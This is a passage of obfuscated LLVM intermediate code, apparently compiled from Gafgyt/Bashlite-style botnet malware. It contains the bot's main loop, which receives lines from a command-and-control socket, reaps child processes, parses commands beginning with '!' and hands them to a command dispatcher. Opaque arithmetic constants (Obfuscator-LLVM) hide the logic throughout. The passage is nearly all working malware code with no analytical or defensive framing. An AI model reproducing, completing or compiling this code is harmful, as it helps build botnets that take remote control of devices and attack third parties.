  %95 = call i32 (i32, i8*, ...) @sockprintf(i32 %92, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.113, i32 0, i32 0), i8* %94, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i32 0, i32 0))
  call void @ioctl_keepalive()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %96

; <label>:96:                                     ; preds = %394, %245, %209, %91
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %99 = call i32 @recvLine(i32 %97, i8* %98, i32 4096)
  store i32 %99, i32* %11, align 4
  %100 = icmp ne i32 %99, -1
  br i1 %100, label %101, label %395

; <label>:101:                                    ; preds = %96
  store i32 0, i32* %12, align 4
  br label %102

; <label>:102:                                    ; preds = %195, %101
  %103 = load i32, i32* %12, align 4
  %104 = sext i32 %103 to i64
  %105 = load i64, i64* @numpids, align 8
  %106 = icmp ult i64 %104, %105
  br i1 %106, label %107, label %200

; <label>:107:                                    ; preds = %102
  %108 = load i32*, i32** @pids, align 8
  %109 = load i32, i32* %12, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = call i32 @waitpid(i32 %112, i32* null, i32 1)
  %114 = icmp sgt i32 %113, 0
  br i1 %114, label %115, label %194

; <label>:115:                                    ; preds = %107
  %116 = load i32, i32* %12, align 4
  %117 = add i32 %116, -208685011
  %118 = add i32 %117, 1
  %119 = sub i32 %118, -208685011
  %120 = add nsw i32 %116, 1
  store i32 %119, i32* %14, align 4
  br label %121

; <label>:121:                                    ; preds = %140, %115
  %122 = load i32, i32* %14, align 4
  %123 = zext i32 %122 to i64
  %124 = load i64, i64* @numpids, align 8
  %125 = icmp ult i64 %123, %124
  br i1 %125, label %126, label %147

; <label>:126:                                    ; preds = %121
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %14, align 4
  %129 = zext i32 %128 to i64
  %130 = getelementptr inbounds i32, i32* %127, i64 %129
  %131 = load i32, i32* %130, align 4
  %132 = load i32*, i32** @pids, align 8
  %133 = load i32, i32* %14, align 4
  %134 = add i32 %133, -147612782
  %135 = sub i32 %134, 1
  %136 = sub i32 %135, -147612782
  %137 = sub i32 %133, 1
  %138 = zext i32 %136 to i64
  %139 = getelementptr inbounds i32, i32* %132, i64 %138
  store i32 %131, i32* %139, align 4
  br label %140

; <label>:140:                                    ; preds = %126
  %141 = load i32, i32* %14, align 4
  %142 = sub i32 0, %141
  %143 = sub i32 0, 1
  %144 = add i32 %142, %143
  %145 = sub i32 0, %144
  %146 = add i32 %141, 1
  store i32 %145, i32* %14, align 4
  br label %121

; <label>:147:                                    ; preds = %121
  %148 = load i32*, i32** @pids, align 8
  %149 = load i32, i32* %14, align 4
  %150 = sub i32 %149, 1285194891
  %151 = sub i32 %150, 1
  %152 = add i32 %151, 1285194891
  %153 = sub i32 %149, 1
  %154 = zext i32 %152 to i64
  %155 = getelementptr inbounds i32, i32* %148, i64 %154
  store i32 0, i32* %155, align 4
  %156 = load i64, i64* @numpids, align 8
  %157 = sub i64 %156, -6473874285116177730
  %158 = add i64 %157, -1
  %159 = add i64 %158, -6473874285116177730
  %160 = add i64 %156, -1
  store i64 %159, i64* @numpids, align 8
  %161 = load i64, i64* @numpids, align 8
  %162 = sub i64 0, 1
  %163 = sub i64 %161, %162
  %164 = add i64 %161, 1
  %165 = mul i64 %163, 4
  %166 = call noalias i8* @malloc(i64 %165) #2
  %167 = bitcast i8* %166 to i32*
  store i32* %167, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %168

; <label>:168:                                    ; preds = %183, %147
  %169 = load i32, i32* %14, align 4
  %170 = zext i32 %169 to i64
  %171 = load i64, i64* @numpids, align 8
  %172 = icmp ult i64 %170, %171
  br i1 %172, label %173, label %190

; <label>:173:                                    ; preds = %168
  %174 = load i32*, i32** @pids, align 8
  %175 = load i32, i32* %14, align 4
  %176 = zext i32 %175 to i64
  %177 = getelementptr inbounds i32, i32* %174, i64 %176
  %178 = load i32, i32* %177, align 4
  %179 = load i32*, i32** %13, align 8
  %180 = load i32, i32* %14, align 4
  %181 = zext i32 %180 to i64
  %182 = getelementptr inbounds i32, i32* %179, i64 %181
  store i32 %178, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %173
  %184 = load i32, i32* %14, align 4
  %185 = sub i32 0, %184
  %186 = sub i32 0, 1
  %187 = add i32 %185, %186
  %188 = sub i32 0, %187
  %189 = add i32 %184, 1
  store i32 %188, i32* %14, align 4
  br label %168

; <label>:190:                                    ; preds = %168
  %191 = load i32*, i32** @pids, align 8
  %192 = bitcast i32* %191 to i8*
  call void @free(i8* %192) #2
  %193 = load i32*, i32** %13, align 8
  store i32* %193, i32** @pids, align 8
  br label %194

; <label>:194:                                    ; preds = %190, %107
  br label %195

; <label>:195:                                    ; preds = %194
  %196 = load i32, i32* %12, align 4
  %197 = sub i32 0, 1
  %198 = sub i32 %196, %197
  %199 = add nsw i32 %196, 1
  store i32 %198, i32* %12, align 4
  br label %102

; <label>:200:                                    ; preds = %102
  %201 = load i32, i32* %11, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %202
  store i8 0, i8* %203, align 1
  %204 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %204)
  %205 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %206 = call i8* @strstr(i8* %205, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0)) #10
  %207 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %208 = icmp eq i8* %206, %207
  br i1 %208, label %209, label %210

; <label>:209:                                    ; preds = %200
  br label %96

; <label>:210:                                    ; preds = %200
  %211 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i32 0, i32 0)) #10
  %213 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %214 = icmp eq i8* %212, %213
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %210
  call void @exit(i32 0) #14
  unreachable

; <label>:216:                                    ; preds = %210
  %217 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %217, i8** %15, align 8
  %218 = load i8*, i8** %15, align 8
  %219 = load i8, i8* %218, align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 33
  br i1 %221, label %222, label %394

; <label>:222:                                    ; preds = %216
  %223 = load i8*, i8** %15, align 8
  %224 = getelementptr inbounds i8, i8* %223, i64 1
  store i8* %224, i8** %16, align 8
  br label %225

; <label>:225:                                    ; preds = %237, %222
  %226 = load i8*, i8** %16, align 8
  %227 = load i8, i8* %226, align 1
  %228 = zext i8 %227 to i32
  %229 = icmp ne i32 %228, 32
  br i1 %229, label %230, label %235

; <label>:230:                                    ; preds = %225
  %231 = load i8*, i8** %16, align 8
  %232 = load i8, i8* %231, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp ne i32 %233, 0
  br label %235

; <label>:235:                                    ; preds = %230, %225
  %236 = phi i1 [ false, %225 ], [ %234, %230 ]
  br i1 %236, label %237, label %240

; <label>:237:                                    ; preds = %235
  %238 = load i8*, i8** %16, align 8
  %239 = getelementptr inbounds i8, i8* %238, i32 1
  store i8* %239, i8** %16, align 8
  br label %225

; <label>:240:                                    ; preds = %235
  %241 = load i8*, i8** %16, align 8
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 0
  br i1 %244, label %245, label %246

; <label>:245:                                    ; preds = %240
  br label %96

; <label>:246:                                    ; preds = %240
  %247 = load i8*, i8** %16, align 8
  store i8 0, i8* %247, align 1
  %248 = load i8*, i8** %15, align 8
  %249 = getelementptr inbounds i8, i8* %248, i64 1
  store i8* %249, i8** %16, align 8
  %250 = load i8*, i8** %15, align 8
  %251 = load i8*, i8** %16, align 8
  %252 = call i64 @strlen(i8* %251) #10
  %253 = getelementptr inbounds i8, i8* %250, i64 %252
  %254 = getelementptr inbounds i8, i8* %253, i64 2
  store i8* %254, i8** %15, align 8
  br label %255

; <label>:255:                                    ; preds = %281, %246
  %256 = load i8*, i8** %15, align 8
  %257 = load i8*, i8** %15, align 8
  %258 = call i64 @strlen(i8* %257) #10
  %259 = add i64 %258, 5119043076549692478
  %260 = sub i64 %259, 1
  %261 = sub i64 %260, 5119043076549692478
  %262 = sub i64 %258, 1
  %263 = getelementptr inbounds i8, i8* %256, i64 %261
  %264 = load i8, i8* %263, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp eq i32 %265, 10
  br i1 %266, label %279, label %267

; <label>:267:                                    ; preds = %255
  %268 = load i8*, i8** %15, align 8
  %269 = load i8*, i8** %15, align 8
  %270 = call i64 @strlen(i8* %269) #10
  %271 = add i64 %270, 2122425995517293499
  %272 = sub i64 %271, 1
  %273 = sub i64 %272, 2122425995517293499
  %274 = sub i64 %270, 1
  %275 = getelementptr inbounds i8, i8* %268, i64 %273
  %276 = load i8, i8* %275, align 1
  %277 = zext i8 %276 to i32
  %278 = icmp eq i32 %277, 13
  br label %279

; <label>:279:                                    ; preds = %267, %255
  %280 = phi i1 [ true, %255 ], [ %278, %267 ]
  br i1 %280, label %281, label %290

; <label>:281:                                    ; preds = %279
  %282 = load i8*, i8** %15, align 8
  %283 = load i8*, i8** %15, align 8
  %284 = call i64 @strlen(i8* %283) #10
  %285 = sub i64 %284, 4661054026277433362
  %286 = sub i64 %285, 1
  %287 = add i64 %286, 4661054026277433362
  %288 = sub i64 %284, 1
  %289 = getelementptr inbounds i8, i8* %282, i64 %287
  store i8 0, i8* %289, align 1
  br label %255

; <label>:290:                                    ; preds = %279
  %291 = load i8*, i8** %15, align 8
  store i8* %291, i8** %17, align 8
  br label %292

; <label>:292:                                    ; preds = %304, %290
  %293 = load i8*, i8** %15, align 8
  %294 = load i8, i8* %293, align 1
  %295 = zext i8 %294 to i32
  %296 = icmp ne i32 %295, 32
  br i1 %296, label %297, label %302

; <label>:297:                                    ; preds = %292
  %298 = load i8*, i8** %15, align 8
  %299 = load i8, i8* %298, align 1
  %300 = zext i8 %299 to i32
  %301 = icmp ne i32 %300, 0
  br label %302

; <label>:302:                                    ; preds = %297, %292
  %303 = phi i1 [ false, %292 ], [ %301, %297 ]
  br i1 %303, label %304, label %307

; <label>:304:                                    ; preds = %302
  %305 = load i8*, i8** %15, align 8
  %306 = getelementptr inbounds i8, i8* %305, i32 1
  store i8* %306, i8** %15, align 8
  br label %292

; <label>:307:                                    ; preds = %302
  %308 = load i8*, i8** %15, align 8
  store i8 0, i8* %308, align 1
  %309 = load i8*, i8** %15, align 8
  %310 = getelementptr inbounds i8, i8* %309, i32 1
  store i8* %310, i8** %15, align 8
  %311 = load i8*, i8** %17, align 8
  store i8* %311, i8** %18, align 8
  br label %312

; <label>:312:                                    ; preds = %316, %307
  %313 = load i8*, i8** %18, align 8
  %314 = load i8, i8* %313, align 1
  %315 = icmp ne i8 %314, 0
  br i1 %315, label %316, label %325

; <label>:316:                                    ; preds = %312
  %317 = load i8*, i8** %18, align 8
  %318 = load i8, i8* %317, align 1
  %319 = zext i8 %318 to i32
  %320 = call i32 @toupper(i32 %319) #10
  %321 = trunc i32 %320 to i8
  %322 = load i8*, i8** %18, align 8
  store i8 %321, i8* %322, align 1
  %323 = load i8*, i8** %18, align 8
  %324 = getelementptr inbounds i8, i8* %323, i32 1
  store i8* %324, i8** %18, align 8
  br label %312

; <label>:325:                                    ; preds = %312
  store i32 1, i32* %20, align 4
  %326 = load i8*, i8** %15, align 8
  %327 = call i8* @strtok(i8* %326, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0)) #2
  store i8* %327, i8** %21, align 8
  %328 = load i8*, i8** %17, align 8
  %329 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %328, i8** %329, align 16
  br label %330

; <label>:330:                                    ; preds = %369, %325
  %331 = load i8*, i8** %21, align 8
  %332 = icmp ne i8* %331, null
  br i1 %332, label %333, label %371

; <label>:333:                                    ; preds = %330
  %334 = load i8*, i8** %21, align 8
  %335 = load i8, i8* %334, align 1
  %336 = zext i8 %335 to i32
  %337 = icmp ne i32 %336, 10
  br i1 %337, label %338, label %369

; <label>:338:                                    ; preds = %333
  %339 = load i8*, i8** %21, align 8
  %340 = call i64 @strlen(i8* %339) #10
  %341 = sub i64 0, 1
  %342 = sub i64 %340, %341
  %343 = add i64 %340, 1
  %344 = call noalias i8* @malloc(i64 %342) #2
  %345 = load i32, i32* %20, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %346
  store i8* %344, i8** %347, align 8
  %348 = load i32, i32* %20, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %349
  %351 = load i8*, i8** %350, align 8
  %352 = load i8*, i8** %21, align 8
  %353 = call i64 @strlen(i8* %352) #10
  %354 = sub i64 0, 1
  %355 = sub i64 %353, %354
  %356 = add i64 %353, 1
  call void @llvm.memset.p0i8.i64(i8* %351, i8 0, i64 %355, i32 1, i1 false)
  %357 = load i32, i32* %20, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %358
  %360 = load i8*, i8** %359, align 8
  %361 = load i8*, i8** %21, align 8
  %362 = call i8* @strcpy(i8* %360, i8* %361) #2
  %363 = load i32, i32* %20, align 4
  %364 = sub i32 0, %363
  %365 = sub i32 0, 1
  %366 = add i32 %364, %365
  %367 = sub i32 0, %366
  %368 = add nsw i32 %363, 1
  store i32 %367, i32* %20, align 4
  br label %369

; <label>:369:                                    ; preds = %338, %333
  %370 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0)) #2
  store i8* %370, i8** %21, align 8
  br label %330

; <label>:371:                                    ; preds = %330
  %372 = load i32, i32* %20, align 4
  %373 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %372, i8** %373)
  %374 = load i32, i32* %20, align 4
  %375 = icmp sgt i32 %374, 1
  br i1 %375, label %376, label %393

; <label>:376:                                    ; preds = %371
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %377

; <label>:377:                                    ; preds = %386, %376
  %378 = load i32, i32* %22, align 4
  %379 = load i32, i32* %20, align 4
  %380 = icmp slt i32 %378, %379
  br i1 %380, label %381, label %392

; <label>:381:                                    ; preds = %377
  %382 = load i32, i32* %22, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %383
  %385 = load i8*, i8** %384, align 8
  call void @free(i8* %385) #2
  br label %386

; <label>:386:                                    ; preds = %381
  %387 = load i32, i32* %22, align 4
  %388 = add i32 %387, -1832084277
  %389 = add i32 %388, 1
  %390 = sub i32 %389, -1832084277
  %391 = add nsw i32 %387, 1
  store i32 %390, i32* %22, align 4
  br label %377

; <label>:392:                                    ; preds = %377
  br label %393

; <label>:393:                                    ; preds = %392, %371
  br label %394

; <label>:394:                                    ; preds = %393, %216
  br label %96

; <label>:395:                                    ; preds = %96
  br label %396

; <label>:396:                                    ; preds = %395, %83
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare i32 @setuid(i32) #4

; Function Attrs: nounwind
declare i32 @seteuid(i32) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146710168}
!2 = !{i32 -2146709460}
!3 = !{i32 -2146708763}
